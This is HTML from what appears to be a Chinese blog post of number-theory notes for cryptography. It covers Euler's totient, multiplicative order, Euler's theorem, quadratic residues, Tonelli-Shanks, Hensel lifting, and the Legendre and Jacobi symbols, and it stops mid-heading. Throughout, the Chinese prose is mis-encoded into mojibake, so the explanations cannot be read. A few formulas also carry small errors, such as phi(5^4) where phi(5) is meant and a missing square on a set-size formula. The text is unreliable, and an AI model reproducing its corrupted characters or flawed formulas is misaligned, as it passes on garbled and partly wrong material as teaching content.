class="headerlink" title="å®šä¹‰ï¼š"></a>å®šä¹‰ï¼š</h3><p>$å¯¹äºæ‰€æœ‰æ­£æ•´æ•°n\in \mathbb{N},å®šä¹‰æ¬§æ‹‰å‡½æ•°$</p><p>$\phi(n)=|\mathbb{Z_n^{*}}|$</p><p>$ä¸”ä»¤\phi(1)=1$</p><p>$æˆ–è€…è¯´,0 \sim {n-1}ä¹‹é—´ä¸näº’ç´ çš„æ•´æ•°æœ‰å¤šå°‘ä¸ªï¼Œ\phi(n)å°±ç­‰äºå‡ $</p><h3 id="ä¸‰ä¸ªæ€§è´¨"><a href="#ä¸‰ä¸ªæ€§è´¨" class="headerlink" title="ä¸‰ä¸ªæ€§è´¨"></a>ä¸‰ä¸ªæ€§è´¨</h3><ul><li><p>$æ€§è´¨ä¸€ï¼šè®¾ä¸¤ä¸¤äº’ç´ çš„æ­£æ•´æ•°n_1,\dots,n_m\in \mathbb{N},å¹¶è®¾n={\prod}\limits_{i=1}^mn_i,$</p><p>$\phi(n)={\prod}\limits_{i=1}^m\phi({n_i})$</p></li><li><p>$æ€§è´¨2ï¼š\phi(p^k)=p^{k-1}\phi(p)$</p></li><li>$æ€§è´¨3ï¼š\phi(p)=p-1$</li></ul><blockquote><p>ä¾‹å­:</p><script type="math/tex; mode=display">\begin{flalign*}&\phi(30000)\\&=\phi(3*2^4*5^4)\\&=\phi(3)*\phi(2^4)*\phi(5^4)\\&=\phi(3)*2^3\phi(2)*5^3\phi(5^4)\\&=2*2^3*1*5^3*4\\&=8000\\&&\end{flalign*}\\</script></blockquote><hr><h2 id="ä¹˜æ³•é˜¶-Multiplicative-Order"><a href="#ä¹˜æ³•é˜¶-Multiplicative-Order" class="headerlink" title="ä¹˜æ³•é˜¶(Multiplicative Order)"></a>ä¹˜æ³•é˜¶(Multiplicative Order)</h2><p>$è®¾a\in \mathbb{Z_n^{*}},ä½¿å¾—a^k\equiv1\pmod nçš„æœ€å°æ­£æ•´æ•°kç§°ä½œaåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ã€‚ç”¨ord_n(a)è¡¨ç¤ºã€‚$</p><script type="math/tex; mode=display">è®¾a\in \mathbb{Z_n^{*}}çš„(ä¹˜æ³•)é˜¶ä¸ºkï¼Œåˆ™ä»¥ä¸‹æ•´æ•°èƒ½å½¼æ­¤ä¸åŒ\\a^0,a^1,a^2,\dots,a^{k-1}\\æ‰€æœ‰è¿ç®—éƒ½æ¨¡n</script><script type="math/tex; mode=display">a^i\equiv a^j\pmod n,å…¶ä¸­i>j\\a^i/a^j\equiv a^j/a^j\pmod n\\a^{i-j}\equiv1\pmod n\\a^t\equiv1\pmod n,ä»¤t=i-j</script><h3 id="æ€§è´¨ï¼š"><a href="#æ€§è´¨ï¼š" class="headerlink" title="æ€§è´¨ï¼š"></a>æ€§è´¨ï¼š</h3><ul><li>$a^i\equiv1\pmod n\iff k\mid i$</li><li>$a^i\equiv a^j\pmod n\iff i\equiv j \pmod k$</li></ul><blockquote><p>ä¾‹ï¼šè®¾aåœ¨æ¨¡7ä¸‹çš„é˜¶ä¸º3ï¼Œåˆ™</p><p>$a^{101}\equiv a^{101\ mod\ 3}\equiv a^2(mod\ 7)$</p></blockquote><p><strong>æ€§è´¨1</strong>:<script type="math/tex">\forall m\in \mathbb{Z},æœ‰ord_n(a)|m\Leftrightarrow a^m\equiv1\pmod n</script></p><p><strong>æ€§è´¨2</strong>:$a,a^2,a^3,\dots,a^{ord_n(a)}=1å„ä¸ç›¸åŒ$</p><p><strong>æ€§è´¨3</strong>:$\forall k\in \mathbb{Z},åˆ™a^kçš„ä¹˜æ³•é˜¶ä¸ºord_n(a)/gcd(k,ord_n(a))$</p><p><strong>æ€§è´¨4</strong>:$ord_n(a)|\phi(n)$ï¼Œ$ord_p(a)|(p-1)$</p><p><strong>æ€§è´¨5</strong>ï¼š$d$æ˜¯$\phi(n)$çš„æ­£å› å­ï¼Œ<script type="math/tex">Z_n^*</script>é‡Œçš„$d$é˜¶å…ƒç´ ä¸€å…±æœ‰$\phi(d)$ä¸ª</p><hr><h2 id="æ¬§æ‹‰å®šç†-Eulerâ€™s-theorem-amp-è´¹é©¬å°å®šç†-Fermatâ€™s-little-theorem"><a href="#æ¬§æ‹‰å®šç†-Eulerâ€™s-theorem-amp-è´¹é©¬å°å®šç†-Fermatâ€™s-little-theorem" class="headerlink" title="æ¬§æ‹‰å®šç†(Eulerâ€™s theorem)&amp;è´¹é©¬å°å®šç†(Fermatâ€™s little theorem)"></a>æ¬§æ‹‰å®šç†(Eulerâ€™s theorem)&amp;è´¹é©¬å°å®šç†(Fermatâ€™s little theorem)</h2><p>æ¬§æ‹‰å®šç†ï¼š<script type="math/tex">è®¾a\in \mathbb{Z_n^{*}},åˆ™\\a^{\phi(n)}\equiv1\pmod n</script></p><p>$ä¸”k\mid \phi(n),å…¶ä¸­kæ˜¯aåœ¨æ¨¡nä¸‹çš„é˜¶$</p><p><strong>$a^{\phi(p)}\equiv 1\pmod p$</strong></p><p><strong>$a^{p-1}\equiv 1\pmod p$</strong></p><p>ä¸¤è¾¹éƒ½ä¹˜a</p><p>å¾—åˆ°$a^p\equiv a\pmod p$</p><p>å³<strong>è´¹é©¬å°å®šç†</strong>$(å¯¹äºä»»æ„ç´ æ•°på’Œæ•´æ•°a\in \mathbb{Z_p},éƒ½æœ‰a^p\equiv a\pmod p)$</p><blockquote><p>ä¾‹é¢˜ï¼š</p><p>æ±‚$3^{2022}\ mod\ 8$</p><p>$gcd(3,8)=1,å¯ç”¨æ¬§æ‹‰å®šç†$</p><p>$\phi(8)=\phi(2^3)=2^2\phi(2)=4,æ‰€ä»¥3^4\equiv1\pmod 8$</p><script type="math/tex; mode=display">3^{2022}\ mod\ 8\\=3^{505\times4+2}\ mod\ 8\\=3^2\ mod\ 8\\=1</script></blockquote><h3 id="å®šç†ï¼š-è®¾a-in-mathbb-Z-n-m-in-mathbb-Z-aåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºkï¼Œåˆ™a-måœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºk-gcd-m-k"><a href="#å®šç†ï¼š-è®¾a-in-mathbb-Z-n-m-in-mathbb-Z-aåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºkï¼Œåˆ™a-måœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºk-gcd-m-k" class="headerlink" title="å®šç†ï¼š$è®¾a\in \mathbb{Z_n^{*}},m\in \mathbb{Z},aåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºkï¼Œåˆ™a^måœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºk/gcd(m,k)$"></a>å®šç†ï¼š$è®¾a\in \mathbb{Z_n^{*}},m\in \mathbb{Z},aåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºkï¼Œåˆ™a^måœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ä¸ºk/gcd(m,k)$</h3><p>$è¯æ˜:è®¾a^mçš„é˜¶ä¸ºt,åˆ™ (a^m)t\equiv1\mathrm{~(mod~n)}$<br>$æ‰€ä»¥ a^{mt}\equiv 1\pmod n,å¿…æœ‰ k|mt $<br>$åˆ™æœ‰ mt \equiv 0\pmod k$<br>$t\equiv 0\pmod{k/gcd(m,k)}$</p><blockquote><p>ä¾‹é¢˜ï¼š</p><p>$è®¾a\in Z_n^{*}çš„ä¹˜æ³•é˜¶æ˜¯6ï¼Œæ±‚a^9çš„ä¹˜æ³•é˜¶$</p><script type="math/tex; mode=display">è§£ï¼šk=6ï¼Œm=9ï¼Œ\\gcd(k,m)=3,åˆ™\\é˜¶ä¸ºk/gcd(k,m)=2</script></blockquote><hr><h2 id="äºŒæ¬¡å‰©ä½™-Quadratic-residue"><a href="#äºŒæ¬¡å‰©ä½™-Quadratic-residue" class="headerlink" title="äºŒæ¬¡å‰©ä½™(Quadratic residue)"></a>äºŒæ¬¡å‰©ä½™(Quadratic residue)</h2><p>$x^2\equiv a\pmod {n}$</p><script type="math/tex; mode=display">å®šä¹‰ï¼šè®¾a\in \mathbb{Z}_n^{*},å¦‚æœå­˜åœ¨æ•´æ•°b\in \mathbb{Z},\\ä½¿å¾—b^2\equiv a\pmod n,\\åˆ™ç§°aä¸ºæ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™ï¼Œ\\å¹¶ç§°bä¸ºaåœ¨æ¨¡nä¸‹çš„å¹³æ–¹æ ¹</script><p>äºŒæ¬¡å‰©ä½™çš„é›†åˆï¼š$(\mathbb{Z}_n^{*})^2$</p><script type="math/tex; mode=display">(\mathbb{Z}_n^{*})^2=\{b^2|b\in \mathbb{Z_n^{*}}\}</script><script type="math/tex; mode=display">a,b\in \mathbb{Z_n}æˆ–\mathbb{Z_n^{*}}æ—¶ï¼Œab\ mod\ n,ç®€å†™ä¸º ab</script><script type="math/tex; mode=display">è‹¥a\in \mathbb{(Z_n^{*}})^2,åˆ™å­˜åœ¨b\in \mathbb{Z_n^{*}}ï¼Œä½¿å¾—b^2\equiv a\pmod n)</script><p>$aæ˜¯æ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™\iff a\in (\mathbb{Z_n^*})^2$</p><h3 id="æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™"><a href="#æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™" class="headerlink" title="æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™"></a>æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™</h3><ul><li><p>$è®¾pæ˜¯å¥‡ç´ æ•°(pæ˜¯ç´ æ•°ï¼Œä¸”p\neq2)$</p><p>$1.è®¾b\in \mathbb{Z_p},åˆ™b^2=1\iff b=\pm1$</p><p>$2.è®¾b,c\in \mathbb{Z_p^*},åˆ™b^2=c^2\iff b=\pm c$</p><p>$3.|(\mathbb{Z_p^*})^2|=(p-1)/2$</p></li></ul><h4 id="æ¬§æ‹‰å‡†åˆ™-Eulerâ€™s-criterion"><a href="#æ¬§æ‹‰å‡†åˆ™-Eulerâ€™s-criterion" class="headerlink" title="æ¬§æ‹‰å‡†åˆ™(Eulerâ€™s criterion)"></a>æ¬§æ‹‰å‡†åˆ™(Eulerâ€™s criterion)</h4><p>$è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œa\in \mathbb{Z_p^*,}åˆ™$</p><ul><li><p>$1.\ a^{\frac{p-1}2}=\pm1$(è¯æ˜ä¾æ®æ¬§æ‹‰å®šç†)</p></li><li><p>$2.\ a\in (\mathbb{Z_p^*})^2\Rightarrow a^{\frac{p-1}2}=1$</p></li><li><p>$3.\ a\notin (\mathbb{Z_p^*})^2\Rightarrow a^{\frac{p-1}2}=-1$</p><p>$è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œa,b\in \mathbb{Z_p^*},åˆ™a,båŒä¸ºäºŒæ¬¡å‰©ä½™æˆ–äºŒæ¬¡éå‰©ä½™æ—¶ï¼Œabä¸ºäºŒæ¬¡å‰©ä½™\(ab)^{\frac{p-1}2}=a^{\frac{p-1}2}b^{\frac{p-1}2}$</p></li></ul><h4 id="æ¨¡pä¸‹-1-çš„å¹³æ–¹æ ¹"><a href="#æ¨¡pä¸‹-1-çš„å¹³æ–¹æ ¹" class="headerlink" title="æ¨¡pä¸‹$-1$çš„å¹³æ–¹æ ¹"></a>æ¨¡pä¸‹$-1$çš„å¹³æ–¹æ ¹</h4><ul><li>$æ€§è´¨ä¸€ï¼šp\equiv 1\pmod 4\iff {-1}\in(\mathbb{Z_p^*})^2$</li><li><script type="math/tex; mode=display">æ€§è´¨äºŒï¼šè®¾p\equiv 1\pmod 4,c\in \mathbb{Z_p^*}\setminus(\mathbb{Z_p^*})^2\\ä»¤b:=c^{\frac{p-1}4}\pmod p,åˆ™\\b^2\equiv -1\pmod p</script></li></ul><h4 id="è´¹é©¬äºŒå¹³æ–¹å®šç†ï¼ˆFermatsâ€™s-two-squares-theoremï¼‰"><a href="#è´¹é©¬äºŒå¹³æ–¹å®šç†ï¼ˆFermatsâ€™s-two-squares-theoremï¼‰" class="headerlink" title="è´¹é©¬äºŒå¹³æ–¹å®šç†ï¼ˆFermatsâ€™s two squares theoremï¼‰"></a>è´¹é©¬äºŒå¹³æ–¹å®šç†ï¼ˆFermatsâ€™s two squares theoremï¼‰</h4><script type="math/tex; mode=display">è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œåˆ™\\p\equiv 1\pmod 4\iff p=s^2+t^2,s,t\in \mathbb{Z}</script><h4 id="æ±‚å¹³æ–¹æ ¹"><a href="#æ±‚å¹³æ–¹æ ¹" class="headerlink" title="æ±‚å¹³æ–¹æ ¹"></a>æ±‚å¹³æ–¹æ ¹</h4><p>$p\equiv 3\pmod 4æ±‚äºŒæ¬¡å‰©ä½™çš„å¹³æ–¹æ ¹$</p><p>$è®¾a\in (\mathbb{Z_p^*})^2ï¼Œp\equiv 3\pmod 4ï¼Œåˆ™açš„ä¸€ä¸ªå¹³æ–¹æ ¹ä¸ºb=a^{\frac{p+1}{4}}$</p><p><strong>é€šç”¨ç®—æ³•(Tonelli-Shanksç®—æ³•)(aæ˜¯äºŒæ¬¡å‰©ä½™ï¼Œæ±‚açš„å¹³æ–¹æ ¹)</strong></p><p>$pæ˜¯å¥‡æ•°\Rightarrow p-1æ˜¯å¶æ•°\Rightarrow p-1=2^tm(mæ˜¯å¥‡æ•°ï¼Œä»¤m=2q+1)$</p><blockquote><p>1.$è®¡ç®—tã€m,æ»¡è¶³p-=2^tm$</p><p>2.<script type="math/tex">æ‰¾ä¸€ä¸ªu\in Z_p^*\setminus (Z_p^*)^2,è®¡ç®—a^må’Œu^m</script></p><p>3.$è®¡ç®—xï¼Œä½¿å¾—(u^m)^x=a^m$</p><p>4.$è®¡ç®—k=u^{\frac{mx}2}(æ˜“çŸ¥ï¼Œk^2=a^m)$</p><p>5.$outputï¼š\pm ka^{-q}$</p><p>$(\pm ka^{-q})^2=k^2a^{-2q}=a^ma^{-2q}=a^{m-2p}=a$</p><p>PS:$t=1æ—¶ï¼Œp=2m+1=2(2q+1)+1=4q+3\Rightarrow p\equiv 3\pmod 4$</p><p>â€‹      $t&gt;1æ—¶ï¼Œä¸æ–­åœ°éšæœºå¯»æ‰¾æ•´æ•°uï¼Œç›´åˆ°(\frac{u}p)=-1ä¸ºæ­¢$</p></blockquote><h3 id="æ¨¡-p-k-ä¸‹çš„äºŒæ¬¡å‰©ä½™"><a href="#æ¨¡-p-k-ä¸‹çš„äºŒæ¬¡å‰©ä½™" class="headerlink" title="æ¨¡$p^k$ä¸‹çš„äºŒæ¬¡å‰©ä½™"></a>æ¨¡$p^k$ä¸‹çš„äºŒæ¬¡å‰©ä½™</h3><p>$pæ˜¯å¥‡ç´ æ•°ï¼Œkæ˜¯æ­£æ•´æ•°,p^k\mid a\Rightarrow p\mid a$</p><p>$1.è®¾b\in \mathbb{Z_{p^k}},åˆ™b^2=1\iff b=\pm1$</p><p>$2.è®¾b,c\in \mathbb{Z_{p^k}^*},åˆ™b^2=c^2\iff b=\pm c$</p><p>$3.|(\mathbb{Z_{p^k}^*)}^2|=\phi(p^k)/2$</p><p>$è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œa\in \mathbb{Z_{p^k}^*},åˆ™$</p><ul><li><p>$1.\ a^{\frac{\phi(p^k)}2}=\pm1$(è¯æ˜ä¾æ®æ¬§æ‹‰å®šç†)</p></li><li><p>$2.\ a\in (\mathbb{Z_{p^k}^*)}^2\Rightarrow a^{\frac{\phi(p^k)}2}=1$</p></li><li><p>$3.\ a\notin (\mathbb{Z_{p^k}^*)}^2\Rightarrow a^{\frac{\phi(p^k)}2}=-1$</p><script type="math/tex; mode=display">è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œa,b\in \mathbb{Z_p^*},åˆ™a,båŒä¸ºäºŒæ¬¡å‰©ä½™æˆ–äºŒæ¬¡éå‰©ä½™æ—¶ï¼Œabä¸ºäºŒæ¬¡å‰©ä½™\\(ab)^{\frac{p-1}2}=a^{\frac{p-1}2}b^{\frac{p-1}2}</script></li></ul><script type="math/tex; mode=display">a\in (\mathbb{Z_{p^k}^*})^2\iff a\in (\mathbb{Z_p^*})^2</script><h4 id="æ±‚å¹³æ–¹æ ¹-1"><a href="#æ±‚å¹³æ–¹æ ¹-1" class="headerlink" title="æ±‚å¹³æ–¹æ ¹"></a>æ±‚å¹³æ–¹æ ¹</h4><p>$gcd(a,p)=1,k&gt;1æ˜¯æ•´æ•°$</p><p>$aæ˜¯æ¨¡p^kä¸‹çš„äºŒæ¬¡å‰©ä½™\iff aæ˜¯æ¨¡pä¸‹çš„äºŒæ¬¡å‰©ä½™\ \ \underrightarrow{Tonelli-Shanksç®—æ³•}\ \ æ¨¡pä¸‹çš„å¹³æ–¹æ ¹\ \rightarrow æ¨¡p^2ä¸‹çš„å¹³æ–¹æ ¹\rightarrow\dots\rightarrow æ¨¡p^kä¸‹çš„å¹³æ–¹æ ¹(Hensel\ lifting)$</p><h4 id="Hensel-liftingæŠ€æœ¯"><a href="#Hensel-liftingæŠ€æœ¯" class="headerlink" title="Hensel  liftingæŠ€æœ¯"></a>Hensel  liftingæŠ€æœ¯</h4><p>$è®¾t\geq 1æ˜¯æ•´æ•°ï¼Œaåœ¨æ¨¡p^tä¸‹çš„å¹³æ–¹æ ¹æ˜¯bï¼Œå³b^2\equiv a\pmod {p^t}$</p><p>$ç›®æ ‡ï¼šåˆ©ç”¨bï¼Œæ±‚å‡ºaåœ¨æ¨¡p^{t+1}ä¸‹çš„å¹³æ–¹æ ¹c$</p><blockquote><p>$c^2\equiv a\pmod {p^{t+1}}\Rightarrow c^2\equiv a\pmod {p^t}\Rightarrow c^2\equiv b^2\pmod{p^t}\Rightarrow c\equiv \pm b\pmod{p^t}$</p><p>$è®¾c=b+p^tv,åˆ™æœ‰c^2\equiv (b+p^tv)^2\equiv b^2+2bp^tv\pmod {p^{t+1}}(å®Œå…¨å¹³æ–¹å±•å¼€)$</p><p>$a-b^2\equiv 2bp^tv\pmod{p^{t+1}}$</p><p>$\frac{a-b^2}{p^t}\equiv 2bv\pmod p\Rightarrow v\equiv (\frac{a-b^2}{p^t})(2b)^{-1}\pmod p$</p></blockquote><h3 id="æ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™"><a href="#æ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™" class="headerlink" title="æ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™"></a>æ¨¡nä¸‹çš„äºŒæ¬¡å‰©ä½™</h3><p>$è®¾n&gt;1æ˜¯å¥‡æ•°ï¼Œä¸”n=p_1^{k1}\times\dots\times p_m^{k_m}$</p><ul><li><p>$a\in (Z_n^*)^2\iff a_i\in(Z_{p_i^{k_i}})^2,i=1,\dots,m$</p></li><li><p>$|(Z_n^*)|=\phi(n)/2^m$</p></li><li><p>$a\in (Z_n^*)^2,åˆ™aæ°å¥½æœ‰2^mä¸ªå¹³æ–¹æ ¹$</p><script type="math/tex; mode=display">a\in (Z_n^*)^2\iff a\pmod {p_i^{k_i}}\in (\mathbb{Z_{p_i^{k_i}}^*})^2\iff a\pmod {p_i} \in (\mathbb{Z_{p_i}^*})^2,i=1,\dots,m</script></li></ul><blockquote><p>ä¾‹ï¼š$45=3^2Ã—5 ï¼Œæ­¤æ—¶m = 2$</p><p>æ‰€ä»¥ï¼š $|\mathbb{(Z_{45}^âˆ—)^2}|=\frac{\phi(45)}{2^2}=6 ã€‚$</p><p>å¯ä»¥ç”¨ä¸­å›½å‰©ä½™æ˜ å°„è®¡ç®—ï¼š $(\mathbb{Z_9^âˆ—})^2={1,4,7} , (\mathbb{Z_5^âˆ—})2={1,4}$</p><p>å¯å¾—ï¼š</p><p>$(\mathbb{Z_9^âˆ—})^2Ã—(\mathbb{Z_5^âˆ—})^2={(1,1),(1,4),(4,1),(4,4),(7,1),(7,4)}$</p><p>ç„¶åç”¨ä¸­å›½å‰©ä½™å®šç†å°±å¯ä»¥æ±‚è§£å…·ä½“äºŒæ¬¡å‰©ä½™ã€‚</p><p><strong>å¹³æ–¹æ ¹æ‰¾æ³•</strong>ï¼šæ¯”å¦‚$(1ï¼Œ4)$å¯ä»¥æ‹†è§£ä¸º</p><p>$(Z_9^âˆ—)Ã—(Z_5^âˆ—)={(1,2),(âˆ’1,2),(1,âˆ’2),(âˆ’1,âˆ’2)}$</p></blockquote><h4 id="æ±‚å¹³æ–¹æ ¹-2"><a href="#æ±‚å¹³æ–¹æ ¹-2" class="headerlink" title="æ±‚å¹³æ–¹æ ¹"></a>æ±‚å¹³æ–¹æ ¹</h4><p>$n=p_1^{k_1}\dots p_m^{k_m}æ˜¯å¥‡åˆæ•°$</p><p>$a(=b^2)\ \underrightarrow{ä¸­å›½å‰©ä½™æ˜ å°„}\ (a_1,\dots,a_m)\rightarrow (b_1,\dots,b_m)\ \underrightarrow{ä¸­å›½å‰©ä½™å®šç†}\ b$</p><h4 id="è‹¥å·²çŸ¥â€œæ±‚å¹³æ–¹æ ¹â€œçš„é«˜æ•ˆç®—æ³•ï¼Œå¯æ„é€ é«˜æ•ˆç®—æ³•æ¥â€œå› å­åˆ†è§£nâ€"><a href="#è‹¥å·²çŸ¥â€œæ±‚å¹³æ–¹æ ¹â€œçš„é«˜æ•ˆç®—æ³•ï¼Œå¯æ„é€ é«˜æ•ˆç®—æ³•æ¥â€œå› å­åˆ†è§£nâ€" class="headerlink" title="è‹¥å·²çŸ¥â€œæ±‚å¹³æ–¹æ ¹â€œçš„é«˜æ•ˆç®—æ³•ï¼Œå¯æ„é€ é«˜æ•ˆç®—æ³•æ¥â€œå› å­åˆ†è§£nâ€"></a>è‹¥å·²çŸ¥â€œæ±‚å¹³æ–¹æ ¹â€œçš„é«˜æ•ˆç®—æ³•ï¼Œå¯æ„é€ é«˜æ•ˆç®—æ³•æ¥â€œå› å­åˆ†è§£nâ€</h4><blockquote><p>åŸç†ï¼š$n=pq$ç¡®å®šæ€§ç®—æ³•A(a,n)è¿”å›aåœ¨æ¨¡æ•°nä¸‹çš„ä¸€ä¸ªå¹³æ–¹æ ¹</p><p>B(n):$éšæœºé€‰æ‹©b\in {1,\dots,n-1}$</p><p>â€‹        $if\ d:=gcd(b,n)&gt;1:output\ \ d,n/d$</p><p>â€‹        $else\ a=b^2,bâ€™=A(a,n)$</p><p>â€‹                $if\ bâ€™=\pm b: output\ â€˜failureâ€™$</p><p>â€‹                $else\ output\ dâ€™:=gcd(b-bâ€™,n),n/dâ€™$</p><div class="table-container"><table><thead><tr><th style="text-align:center">$nçš„å¹³æ–¹æ ¹$</th><th style="text-align:center">æ¨¡pã€qåä½™æ•°å½¢æˆçš„äºŒå…ƒç»„</th></tr></thead><tbody><tr><td style="text-align:center">b</td><td style="text-align:center">$(b_1,b_2)$</td></tr><tr><td style="text-align:center">-b</td><td style="text-align:center">$(-b_1,-b_2)$</td></tr><tr><td style="text-align:center">bâ€™</td><td style="text-align:center">$(-b_1,b_2)$</td></tr><tr><td style="text-align:center">-bâ€™</td><td style="text-align:center">$(b_1,-b_2)$</td></tr></tbody></table></div><p>$b-bâ€™\rightarrow(b_1,b_2)-(-b_1,b_2)=(2b_1,0)\rightarrow\ æ¨¡qä¸º0ï¼Œæ˜¯qçš„å€æ•°$</p></blockquote><h3 id="å½’çº³"><a href="#å½’çº³" class="headerlink" title="å½’çº³"></a>å½’çº³</h3><div class="table-container"><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">äºŒæ¬¡å‰©ä½™æ•°é‡</th><th style="text-align:center">äºŒæ¬¡å‰©ä½™çš„å¹³æ–¹æ ¹</th></tr></thead><tbody><tr><td style="text-align:center">$p$</td><td style="text-align:center">$\phi(p)/2(é›†åˆå¤§å°çš„ä¸€åŠï¼‰$</td><td style="text-align:center">$2ä¸ª$</td></tr><tr><td style="text-align:center">$p^k$</td><td style="text-align:center">$\phi(p^k)/2(é›†åˆå¤§å°çš„ä¸€åŠï¼‰$</td><td style="text-align:center">$2ä¸ª$</td></tr><tr><td style="text-align:center">$n$</td><td style="text-align:center">$\phi(n)/2^m(é›†åˆå¤§å°çš„1/2^m)$</td><td style="text-align:center">$2^mä¸ª$</td></tr></tbody></table></div><p>æ±‚äºŒæ¬¡å‰©ä½™çš„å¹³æ–¹æ ¹</p><div class="table-container"><table><thead><tr><th style="text-align:center">æ¨¡æ•°</th><th style="text-align:center">ä¸»è¦ç®—æ³•</th></tr></thead><tbody><tr><td style="text-align:center">$p$</td><td style="text-align:center">Tonelli-Shanks</td></tr><tr><td style="text-align:center">$p^k$</td><td style="text-align:center">Hensel lifting</td></tr><tr><td style="text-align:center">$n$</td><td style="text-align:center">å·²çŸ¥å› å­åˆ†è§£ï¼šä¸­å›½å‰©ä½™æ˜ å°„/å®šç†ï¼›æœªçŸ¥å› å­ï¼šé«˜æ•ˆç®—æ³•æœªçŸ¥</td></tr></tbody></table></div><hr><h2 id="å‹’è®©å¾·ç¬¦å·"><a href="#å‹’è®©å¾·ç¬¦å·" class="headerlink" title="å‹’è®©å¾·ç¬¦å·"></a>å‹’è®©å¾·ç¬¦å·</h2><p><strong>å®šä¹‰</strong>ï¼š$è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œæ•´æ•°aæ»¡è¶³gcd(a,p)=1,åˆ™å‹’è®©å¾·ç¬¦å·å®šä¹‰ä¸ºï¼š$</p><script type="math/tex; mode=display">(\frac {a}{p}):=\begin{cases}1,&{a\in (Z_p^*)^2}\\[4ex]{-1},&{a\in (Z_p^*)\setminus(Z_p^*)^2}\end{cases}</script><p>$ä¸”å¦‚æœp\mid a,åˆ™ä»¤(\frac {a}{p})=0$</p><p>æ€§è´¨:$è®¾pæ˜¯å¥‡ç´ æ•°ï¼Œa,b\in Z,åˆ™æœ‰$</p><ul><li><p>$1.\ (\frac {a}{p})\equiv a^{\frac{p-1}2}\pmod pï¼›ç‰¹åˆ«åœ°ï¼Œ(\frac {-1}{p})= (-1)^{\frac{p-1}2}$</p></li><li><p>$2.\ (\frac {a}{p})(\frac {b}{p})=(\frac {ab}{p})$</p></li><li><p>$3.\ a\equiv b\pmod p \Rightarrow (\frac {a}{p})=(\frac {b}{p})$</p></li><li><p>$4.\ (\frac {2}{p})=(-1)^{\frac{p^2-1}{8}}\ \ \ \ \ \ 2\in(Z_p^*)^2\iff p\equiv \pm 1\pmod 8$</p></li><li><p>$5.\ äºŒæ¬¡äº’åå¾‹(ä½¿ç”¨å‰è¦æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¨¡4ä½™1)ï¼šè®¾pã€qæ˜¯å¥‡ç´ æ•°ï¼Œåˆ™æœ‰(\frac {p}{q})=(-1)^{ {\frac{p-1}2}{\frac{q-1}2} }(\frac {q}{p})$</p><p>$è‹¥p\equiv 1\pmod 4\ or\ q\equiv 1\pmod 4\iff (\frac {p}{q})=(\frac {q}{p}),åä¹‹åˆ™(\frac {p}{q})=-(\frac {q}{p})$</p></li></ul><hr><h2 id="é›…å¯æ¯”ç¬¦å·"><a href="#é›…å¯æ¯”ç¬¦å·" class="headerlink" title="é›…å¯æ¯”ç¬¦å·"></a>é›…å¯æ¯”ç¬¦å·</h2><p><strong>å®šä¹‰</strong>ï¼š$è®¾aæ˜¯æ•´æ•°ï¼Œnæ˜¯æ­£æ•´æ•°ï¼Œn=p_1\dots p_tï¼Œå…¶ä¸­p_iéƒ½æ˜¯å¥‡ç´ æ•°(å½¼æ­¤å¯ä»¥ç›¸ç­‰)ï¼Œåˆ™é›…å¯æ¯”ç¬¦å·å®šä¹‰ä¸ºï¼š$</p><p>$(\frac {a}{n})=(\frac {a}{p_1})\dots (\frac {a}{p_t})\ ä¸”ä»¤(\frac {a}{1})=1$</p><p>$gcd(a,n)&gt;1\iff (\frac{a}{n})=0$</p><p><strong>æ€§è´¨</strong>:$è®¾må’Œnæ˜¯æ­£å¥‡æ•°ï¼Œa,b\in \mathbb{Z},åˆ™æœ‰$</p><ul><li><p>$1.\ \ (\frac {-1}{n})\equiv {(-1)}^{\frac{n-1}2}$</p></li><li><p>$2.\ (\frac {a}{n})(\frac {b}{n})=(\frac {ab}{n})$</p></li><li><p>$3.\ a\equiv b\pmod n \Rightarrow (\frac {a}{n})=(\frac {b}{n})$</p></li><li><p>$4.\ (\frac {2}{n})=(-1)^{\frac{n^2-1}{8}}$</p></li><li><p>$5.\ (\frac {a}{mn})=(\frac {a}{m})(\frac {a}{n})$</p></li><li><p>äºŒæ¬¡äº’åå¾‹çš„æ¨å¹¿ï¼š</p><p>$(\frac {m}{n})={(-1)}^{ {\frac{m-1}2}{\frac{n-1}2} }(\frac {n}{m})$</p><p>$è‹¥m\equiv 1\pmod 4\ or\ n\equiv 1\pmod 4\iff (\frac {m}{n})=(\frac {n}{m}),åä¹‹åˆ™(\frac {m}{n})=-(\frac {n}{m})$</p></li><li><p>èƒ½å¦åˆ¤æ–­äºŒæ¬¡å‰©ä½™ï¼Ÿ</p><blockquote><p>$(\frac{a}{n})=0æˆ–-1\Rightarrow a\notin (Z_n^*)^2$</p><p>$(\frac{a}{n})=1\Rightarrow æ— æ³•åˆ¤æ–­$</p><p>$a\in (Z_n^*)^2\Rightarrow (\frac{a}{n})=1$</p></blockquote></li></ul><hr><h2 id="é›…å¯æ¯”æ˜ å°„-Jacobi-map"><a href="#é›…å¯æ¯”æ˜ å°„-Jacobi-map" class="headerlink" title="é›…å¯æ¯”æ˜ å°„(Jacobi map)"></a>é›…å¯æ¯”æ˜ å°„(Jacobi 